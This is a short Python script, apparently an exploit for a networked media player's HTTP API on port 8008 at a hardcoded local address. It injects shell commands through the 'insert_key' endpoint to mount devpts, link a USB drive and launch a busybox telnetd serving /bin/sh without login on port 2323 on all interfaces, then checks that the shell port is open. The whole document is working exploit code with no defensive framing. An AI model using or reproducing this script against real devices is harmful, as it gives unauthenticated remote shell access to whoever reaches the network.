import urllib.parse
import urllib.request
import time
import socket
import sys

TARGET_IP = "192.168.1.4"

cmds = [
    'mkdir -p /dev/pts',
    'mount -t devpts devpts /dev/pts 2>/dev/null',
    'for d in /opt/sybhttpd/localhost.drives/USB_DRIVE*; do [ -d "$d" ] && ln -sf "$d" /share && break; done',
    '/share/busybox_stock telnetd -p 2323 -l /bin/sh -b 0.0.0.0 &'
]

print("[*] Waiting for port 8008 DavidBox API...")
for attempt in range(15):
    try:
        url = f"http://{TARGET_IP}:8008/system?arg0=get_device_info"
        resp = urllib.request.urlopen(url, timeout=2).read().decode('utf-8')
        print("[+] Port 8008 ready!")
        break
    except Exception:
        time.sleep(1)

print("[*] Dispatching shell setup commands...")
for cmd in cmds:
    for attempt in range(5):
        try:
            url = f"http://{TARGET_IP}:8008/system?arg0=insert_key&arg1={urllib.parse.quote(cmd)}&arg2=4896"
            resp = urllib.request.urlopen(url, timeout=3).read().decode('utf-8')
            if '<returnValue>0' in resp:
                print(f"[+] {cmd[:30]} -> SUCCESS")
                break
        except Exception as e:
            time.sleep(1)

time.sleep(1)
s = socket.socket()
s.settimeout(2.0)
res = s.connect_ex((TARGET_IP, 2323))
s.close()
print(f"[*] Port 2323 status: {res} (0 = OPEN!)")
if res != 0:
    sys.exit(1)
